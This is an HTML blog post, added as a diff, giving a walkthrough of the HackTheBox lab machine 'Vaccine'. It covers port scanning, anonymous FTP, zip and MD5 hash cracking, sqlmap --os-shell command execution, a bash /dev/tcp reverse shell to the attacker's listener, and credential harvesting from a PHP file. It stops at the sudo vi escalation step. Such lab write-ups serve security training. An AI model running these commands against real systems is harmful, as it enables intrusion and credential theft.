@@ -1,0 +1,391 @@
+<!DOCTYPE html><html class="appearance-dark" lang="en"><head><meta charset="UTF-8"><title>Vaccine</title><meta name="description" content="scientia potentia est."><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/hexo-theme-Claudia/images/favicon.jpg"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+Machine IP: 10.129.230.39
+Information GatheringNMAP Scanning
+command used: (scanning for all ports fast and efficient)
+
+sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.129.230.39
+
+→ output:
+Not shown: 65515 closed tcp ports (reset), 17 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+POR.."><meta name="generator" content="Hexo 7.1.1"></head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Rãzvan's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Vaccine</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Information-Gathering"><span class="toc-text">Information Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NMAP-Scanning"><span class="toc-text">NMAP Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Services"><span class="toc-text">Services</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-22-Default-Port-for-ssh"><span class="toc-text">TCP 22 (Default Port for ssh)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-80-Default-Port-for-HTTP"><span class="toc-text">TCP 80 (Default Port for HTTP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-21-ftp"><span class="toc-text">TCP 21 (ftp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLMAP"><span class="toc-text">SQLMAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/HackTheBox"><i class="tag post-item-tag">HackTheBox</i></a><a href="/tags/Very%20Easy"><i class="tag post-item-tag">Very Easy</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Vaccine</h1><time class="has-text-grey" datetime="2024-05-24T13:43:30.000Z">2024-05-24</time><article class="mt-2 post-content"><p><img src="/../vaccine_img/4abda8d32b5c71e6905244988879c575.webp" alt="alt text"></p>
+<p>Machine IP: 10.129.230.39</p>
+<h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><ul>
+<li>command used: (scanning for all ports fast and efficient)</li>
+</ul>
+<pre><code class="hljs powershell">sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span></code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs powershell">Not shown: <span class="hljs-number">65515</span> closed tcp ports (reset), <span class="hljs-number">17</span> filtered tcp ports (no<span class="hljs-literal">-response</span>)
+Some closed ports may be reported as filtered due to <span class="hljs-literal">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+<span class="hljs-number">21</span>/tcp open  ftp     syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span>
+<span class="hljs-number">22</span>/tcp open  ssh     syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span>
+<span class="hljs-number">80</span>/tcp open  http    syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span></code></pre>
+
+<ul>
+<li>command used: ( scanning the ports we got )</li>
+</ul>
+<pre><code class="hljs bash">nmap -A -sC -sV -p</code></pre>
+
+<p>→ output:</p>
+<pre><code class="hljs powershell">Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-23</span> <span class="hljs-number">22</span>:<span class="hljs-number">46</span> EDT
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span>
+Host is up (<span class="hljs-number">0.046</span>s latency).
+
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span>
+| ftp<span class="hljs-literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)
+|_<span class="hljs-literal">-rwxr-xr-x</span>    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">2533</span> Apr <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> backup.zip
+| ftp<span class="hljs-literal">-syst</span>: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:<span class="hljs-number">10.10</span>.<span class="hljs-number">14.82</span>
+|      Logged <span class="hljs-keyword">in</span> as ftpuser
+|      <span class="hljs-built_in">TYPE</span>: ASCII
+|      No session bandwidth limit
+|      Session timeout <span class="hljs-keyword">in</span> seconds is <span class="hljs-number">300</span>
+|      Control connection is plain text
+|      <span class="hljs-keyword">Data</span> connections will be plain text
+|      At session startup, client count was <span class="hljs-number">4</span>
+|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable
+|_End of status
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.0</span>p1 Ubuntu <span class="hljs-number">6</span>ubuntu0.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh<span class="hljs-literal">-hostkey</span>: 
+|   <span class="hljs-number">3072</span> c0:ee:<span class="hljs-number">58</span>:<span class="hljs-number">07</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:b0:<span class="hljs-number">0</span>b:<span class="hljs-number">91</span>:<span class="hljs-number">65</span>:b2:<span class="hljs-number">59</span>:<span class="hljs-number">56</span>:<span class="hljs-number">95</span>:<span class="hljs-number">27</span>:a4 (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-built_in">ac</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">81</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:<span class="hljs-number">22</span>:d7:a7:<span class="hljs-number">41</span>:<span class="hljs-number">7</span>d:<span class="hljs-number">81</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">1</span>b:b8:b2:<span class="hljs-number">51</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">5</span>b:c3:<span class="hljs-number">21</span>:df:ef:a2:<span class="hljs-number">0</span>b:c9:<span class="hljs-number">5</span>e:<span class="hljs-number">03</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">69</span>:d0:<span class="hljs-number">28</span> (ED25519)
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))
+|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)
+| http<span class="hljs-literal">-cookie-flags</span>: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="hljs-built_in">set</span>
+|_http<span class="hljs-literal">-title</span>: MegaCorp Login
+Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port
+Aggressive OS guesses: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.8</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">5.0</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.3</span> - <span class="hljs-number">5.4</span> (<span class="hljs-number">95</span>%), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.0</span> - <span class="hljs-number">5.5</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">94</span>%), ASUS RT<span class="hljs-literal">-N56U</span> WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">93</span>%)
+No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non<span class="hljs-literal">-ideal</span>).
+Network Distance: <span class="hljs-number">2</span> hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (<span class="hljs-keyword">using</span> port 21/tcp)
+HOP RTT      ADDRESS
+<span class="hljs-number">1</span>   <span class="hljs-number">44.65</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span>
+<span class="hljs-number">2</span>   <span class="hljs-number">46.96</span> ms <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span></code></pre>
+
+<h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p>
+<p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p>
+<p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p>
+<p>-&gt; SSH package version:</p>
+<pre><code class="hljs bash">nc -vn 10.129.230.39 22</code></pre>
+
+<ul>
+<li>output:</li>
+</ul>
+<pre><code class="hljs bash">└─$ nc -vn 10.129.230.39 22
+(UNKNOWN) [10.129.230.39] 22 (ssh) open
+SSH-2.0-OpenSSH_8.0p1 Ubuntu-6ubuntu0.1
+</code></pre>
+
+<p>-&gt; SSH key fingerprint:</p>
+<pre><code class="hljs bash">ssh root@10.129.230.39</code></pre>
+
+<ul>
+<li>output:</li>
+</ul>
+<pre><code class="hljs bash">└─$ ssh root@10.129.230.39
+The authenticity of host <span class="hljs-string">&#x27;10.129.230.39 (10.129.230.39)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span>
+<span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span>
+<span class="hljs-string">This key is not known by any other names.</span>
+<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? </span></code></pre>
+
+<h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul>
+<li><blockquote>
+<p>Web Server:</p>
+</blockquote>
+</li>
+</ul>
+<pre><code class="hljs bash">└─$ curl -i http://10.129.230.39 | <span class="hljs-built_in">head</span> -n 50
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2312  100  2312    0     0  23303      0 --:--:-- --:--:-- --:--:-- 23353
+HTTP/1.1 200 OK
+Date: Fri, 24 May 2024 03:04:14 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Set-Cookie: PHPSESSID=uuvnulvd19llu6dpi80lebqug9; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 2312
+Content-Type: text/html; charset=UTF-8
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=<span class="hljs-string">&quot;en&quot;</span> &gt;
+&lt;<span class="hljs-built_in">head</span>&gt;
+  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;
+  &lt;title&gt;MegaCorp Login&lt;/title&gt;
+  &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;&lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;./style.css&quot;</span>&gt;
+
+&lt;/head&gt;
+  &lt;h1 align=center&gt;MegaCorp Login&lt;/h1&gt;</code></pre>
+
+<h3 id="TCP-21-ftp"><a href="#TCP-21-ftp" class="headerlink" title="TCP 21 (ftp)"></a>TCP 21 (ftp)</h3><p>→ Login anonymously:</p>
+<pre><code class="hljs bash">└─$ ftp 10.129.230.39
+Connected to 10.129.230.39.
+220 (vsFTPd 3.0.3)
+Name (10.129.230.39:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.</code></pre>
+
+<p>→ Get the file </p>
+<pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span> -la
+229 Entering Extended Passive Mode (|||10763|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Apr 13  2021 .
+drwxr-xr-x    2 0        0            4096 Apr 13  2021 ..
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+226 Directory send OK.
+ftp&gt; get backup.zip
+<span class="hljs-built_in">local</span>: backup.zip remote: backup.zip
+229 Entering Extended Passive Mode (|||10401|)
+150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> backup.zip (2533 bytes).
+100% |*****************************************************************************************************************************************************************|  2533      808.11 KiB/s    00:00 ETA
+226 Transfer complete.
+2533 bytes received <span class="hljs-keyword">in</span> 00:00 (49.96 KiB/s)</code></pre>
+
+<p>Besides SSH and HTTP, what other service is hosted on this box? </p>
+<ul>
+<li>FTP</li>
+</ul>
+<p>This service can be configured to allow login with any password for specific username. What is that username? </p>
+<ul>
+<li>anonymous</li>
+</ul>
+<p> What is the name of the file downloaded over this service? </p>
+<ul>
+<li>backup.zip</li>
+</ul>
+<p> What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? </p>
+<ul>
+<li>zip2john</li>
+</ul>
+<p>→ Generate a hash from <code>backup.zip</code> with zip2john:</p>
+<pre><code class="hljs bash">└─$ zip2john backup.zip &gt; protected.hash</code></pre>
+
+<pre><code class="hljs bash">└─$ <span class="hljs-built_in">cat</span> protected.hash       
+backup.zip:$pkzip<span class="hljs-variable">$2</span>*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip</code></pre>
+
+<p>→ Now we crack the hash:</p>
+<pre><code class="hljs bash">└─$ john protected.hash</code></pre>
+
+<ul>
+<li>output:</li>
+</ul>
+<pre><code class="hljs bash">Proceeding with wordlist:/usr/share/john/password.lst
+741852963        (backup.zip)</code></pre>
+
+<p>→ Let’s see the password in a more readable format with —show:</p>
+<pre><code class="hljs bash">└─$ john --show protected.hash
+
+backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+
+1 password <span class="hljs-built_in">hash</span> cracked, 0 left</code></pre>
+
+<p>→ Unzip the archieve with the password we got : <code>741852963</code></p>
+<pre><code class="hljs bash">└─$ unzip -P 741852963 backup.zip -d extracted_files
+</code></pre>
+
+<p>→ Go into the extracted_files:</p>
+<pre><code class="hljs bash">└─$ <span class="hljs-built_in">cd</span> extracted_files 
+                                                                                                                                                                                                              
+┌──(kali㉿kali)-[~/Downloads/extracted_files]
+└─$ <span class="hljs-built_in">ls</span>
+index.php  style.css</code></pre>
+
+<p> Interesting.. </p>
+<p>→ Let’s check index.php:</p>
+<pre><code class="hljs bash">└─$ nano index.php</code></pre>
+
+<ul>
+<li>output:</li>
+</ul>
+<pre><code class="hljs bash"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</code></pre>
+
+<p>username: admin</p>
+<p>password: 2cb42f8734ea607eefed3b70af13bbd3</p>
+<p>It seems like the <code>password</code> is cracked let’s head into <a target="_blank" rel="noopener" href="http://crackstation.net/">crackstation.net</a> and try to see if we get the password:</p>
+<p><img src="/../vaccine_img/1.png" alt="alt text"></p>
+<p>Password: <code>qwerty789</code></p>
+<p>Check basic sql: </p>
+<p><img src="/../vaccine_img/2.png" alt="alt text"></p>
+<p>We can see that what we type in the search parameter is passed by in the URL, i think this web app is vulnerable to Error Based SQLi so, let’s intercept a request with BurpSuite to see what method we get while searching. (POST or GET)</p>
+<p><img src="/../vaccine_img/3.png" alt="alt text"></p>
+<p>When searching with the search parameter the request is <code>GET</code> </p>
+<p>→ Let’s copy the PHPSESSID and use sqlmap:</p>
+<p><img src="/../vaccine_img/4.png" alt="alt text"></p>
+<p><code>h36ve0ev3rirnii4toagi9vc9v</code></p>
+<h3 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h3><ul>
+<li>command:</li>
+</ul>
+<pre><code class="hljs bash">─$ sqlmap -u <span class="hljs-string">&#x27;http://10.129.91.50/dashboard.php?search=abracadabra&#x27;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=h36ve0ev3rirnii4toagi9vc9v&quot;</span> --os-shell</code></pre>
+
+<p>→output:</p>
+<pre><code class="hljs bash">[02:36:02] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[02:36:02] [INFO] fingerprinting the back-end DBMS operating system
+[02:36:02] [INFO] the back-end DBMS operating system is Linux
+[02:36:02] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA
+[02:36:03] [INFO] retrieved: <span class="hljs-string">&#x27;1&#x27;</span>
+[02:36:03] [INFO] going to use <span class="hljs-string">&#x27;COPY ... FROM PROGRAM ...&#x27;</span> <span class="hljs-built_in">command</span> execution
+[02:36:03] [INFO] calling Linux OS shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;x&#x27;</span> or <span class="hljs-string">&#x27;q&#x27;</span> and press ENTER
+os-shell&gt;</code></pre>
+
+<p> What option can be passed to sqlmap to try to get command execution via the sql injection? </p>
+<ul>
+<li>–os-shell</li>
+</ul>
+<p>Now we have shell</p>
+<pre><code class="hljs bash">os-shell&gt; <span class="hljs-built_in">id</span>
+[02:44:12] [INFO] retrieved: <span class="hljs-string">&#x27;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#x27;</span>
+<span class="hljs-built_in">command</span> standard output: <span class="hljs-string">&#x27;uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)&#x27;</span></code></pre>
+
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>→ Start a nc listener on your machine:</p>
+<pre><code class="hljs bash">└─$ sudo nc -lvnp 6666</code></pre>
+
+<p>→ On your os-shell do this :</p>
+<pre><code class="hljs bash">bash -c “bash -i &gt;&amp; /dev/tcp/&#123;your_ip&#125;/6666 0&gt;&amp;1”</code></pre>
+
+<ul>
+<li>output:(we got the shell)</li>
+</ul>
+<p><img src="/../vaccine_img/5.png" alt="alt text"></p>
+<p>→ Spawning a &#x2F;bin&#x2F;bash using python:</p>
+<ul>
+<li>command:</li>
+</ul>
+<pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;bin/bash&quot;);&#x27;</span></code></pre>
+
+<p>→ Go into <code>/var/lib/postgresql</code> :</p>
+<pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11$ <span class="hljs-built_in">cd</span> /var/lib/postgresql
+<span class="hljs-built_in">cd</span> /var/lib/postgresql
+postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">ls</span> -la
+<span class="hljs-built_in">ls</span> -la
+total 24
+drwxr-xr-x  5 postgres postgres 4096 Oct 11  2021 .
+drwxr-xr-x 39 root     root     4096 Jul 23  2021 ..
+drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 11
+lrwxrwxrwx  1 root     root        9 Feb  4  2020 .bash_history -&gt; /dev/null
+drwxrwxr-x  3 postgres postgres 4096 Jul 23  2021 .<span class="hljs-built_in">local</span>
+lrwxrwxrwx  1 root     root        9 Feb  4  2020 .psql_history -&gt; /dev/null
+drwx------  2 postgres postgres 4096 Jul 23  2021 .ssh
+-r--------  1 postgres postgres   33 Oct 11  2021 user.txt</code></pre>
+
+<p>Read user.txt</p>
+<pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql$ <span class="hljs-built_in">cat</span> user.txt
+<span class="hljs-built_in">cat</span> user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7</code></pre>
+
+<p>User flag: ec9b13ca4d6229cd5cc1e09980965bf7</p>
+<p>→ Check <code>/var/www/html</code></p>
+<pre><code class="hljs bash">postgres@vaccine:/var/lib/postgresql/11/main$ <span class="hljs-built_in">cd</span> /var/www/html
+<span class="hljs-built_in">cd</span> /var/www/html
+postgres@vaccine:/var/www/html$ <span class="hljs-built_in">ls</span> -la
+<span class="hljs-built_in">ls</span> -la
+total 392
+drwxr-xr-x 2 root root   4096 Jul 23  2021 .
+drwxr-xr-x 3 root root   4096 Jul 23  2021 ..
+-rw-rw-r-- 1 root root 362847 Feb  3  2020 bg.png
+-rw-r--r-- 1 root root   4723 Feb  3  2020 dashboard.css
+-rw-r--r-- 1 root root     50 Jan 30  2020 dashboard.js
+-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php
+-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php
+-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt
+-rw-r--r-- 1 root root   3274 Feb  3  2020 style.css
+postgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dasboard.php | grep password
+<span class="hljs-built_in">cat</span> dasboard.php | grep password
+<span class="hljs-built_in">cat</span>: dasboard.php: No such file or directory
+postgres@vaccine:/var/www/html$ <span class="hljs-built_in">cat</span> dashboard.php | grep password
+<span class="hljs-built_in">cat</span> dashboard.php | grep password
+          <span class="hljs-variable">$conn</span> = pg_connect(<span class="hljs-string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</code></pre>
+
+<p>user&#x3D;postgres password&#x3D;P@s5w0rd!</p>
+<p>→ Connnect to ssh usingn this password and username :</p>
+<pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh postgres@10.129.91.50
+The authenticity of host <span class="hljs-string">&#x27;10.129.91.50 (10.129.91.50)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span>
+<span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span>
+<span class="hljs-string">This host key is known by the following other names/addresses:</span>
+<span class="hljs-string">    ~/.ssh/known_hosts:1: [hashed name]</span>
+<span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="hljs-string">Warning: Permanently added &#x27;</span>10.129.91.50<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span>
+<span class="hljs-string">postgres@10.129.91.50&#x27;</span>s password: 
+Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri 24 May 2024 07:07:29 AM UTC
+
+  System load:  0.01              Processes:             195
+  Usage of /:   32.6% of 8.73GB   Users logged <span class="hljs-keyword">in</span>:       0
+  Memory usage: 19%               IP address <span class="hljs-keyword">for</span> ens160: 10.129.91.50
+  Swap usage:   0%
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+The list of available updates is more than a week old.
+To check <span class="hljs-keyword">for</span> new updates run: sudo apt update
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the
+individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+postgres@vaccine:~$</code></pre>
+
+<p>→ sudo -l </p>
+<pre><code class="hljs bash">postgres@vaccine:~$ sudo -l
+[sudo] password <span class="hljs-keyword">for</span> postgres: 
+Matching Defaults entries <span class="hljs-keyword">for</span> postgres on vaccine:
+    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre>
+
+<p>→ Head out to GTFOBins and check for vi</p>
